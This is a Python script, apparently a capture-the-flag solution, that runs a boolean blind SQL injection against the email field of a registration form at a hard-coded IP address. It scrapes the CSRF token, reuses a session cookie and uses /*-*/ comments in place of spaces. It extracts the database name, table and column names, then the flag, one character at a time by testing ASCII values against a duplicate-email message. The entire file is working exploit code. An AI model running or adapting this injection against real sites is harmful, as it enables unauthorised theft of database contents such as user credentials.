
url = "http://111.198.29.45:38278/register"
cookie= { "session":"5fdcfaa1-2489-40be-a983-a7e545f6f858" }
regexp1 = r'value="(.*)"'    # 正则表达式 , 用于捕获所有 value 字段的值
regexp2 = r'Please use a different email address.'    # 正则表达式 , 用于捕获所有的 Email 重复信息 

# 获取 csrf_token
def get_csrf_token():
    # 发送 GET 请求
    response = requests.get(url,cookies=cookie)
    # 获取 HTTP 响应数据包
    res = response.text
    # 进行正则匹配 , 发现返回列表中第一个 value 键值对就是 csrf_token 的值 , 获取它
    csrf_token = re.findall(regexp1, res)[0]
    #print(csrf_token)
    return csrf_token

# 发送修改 profile 的 post 数据包
def post_register():
    result = ""
    # 调用 get_csrf_token 函数 , 得到 csrf_token 数据包
    csrf_token = get_csrf_token()
    # 循环发送数据包
    # 构造 post 数据部
    # 猜测版本信息最长10位
    for i in range(1,43):
        # 猜测版本信息由可显字符组成( 31 < ASCII < 127 )
        for j in range(32,127):
            #具体的 Payload , 用户可自行更改
            # 爆出当前数据库( flask ) 
            #datas = {"csrf_token":csrf_token,"username":"a","email":"a'/*-*/or/*-*/1=(ASCII(MID((select database())," + str(i) + ",1))=" + str(j) + ")#@a.com","password":"a","password2":"a","submit":"register"}
            # 爆出当前数据库中的表 ( flag )
            #datas = {"csrf_token":csrf_token,"username":"a","email":"a'/*-*/or/*-*/1=(ASCII(MID((select group_concat(table_name) from information_schema.tables where table_schema = 'flask')," + str(i) + ",1))=" + str(j) + ")#@a.com","password":"a","password2":"a","submit":"register"}
            # 爆出 flag 表中的字段 ( flag )
            #datas = {"csrf_token":csrf_token,"username":"a","email":"a'/*-*/or/*-*/1=(ASCII(MID((select group_concat(column_name) from information_schema.columns where table_schema = 'flask' and table_name = 'flag')," + str(i) + ",1))=" + str(j) + ")#@a.com","password":"a","password2":"a","submit":"register"}
            # 爆出 flag 表中的字段 ( flag )
            datas = {"csrf_token":csrf_token,"username":"a","email":"a'/*-*/or/*-*/1=(ASCII(MID((select flag from flag)," + str(i) + ",1))=" + str(j) + ")#@a.com","password":"a","password2":"a","submit":"register"}
            response = requests.post(url,data=datas,cookies=cookie,timeout=3)
            res = response.text
            if regexp2 in response.text:
                result += chr(j)
                print(result)
                break
            
if __name__ == '__main__':
    post_register()
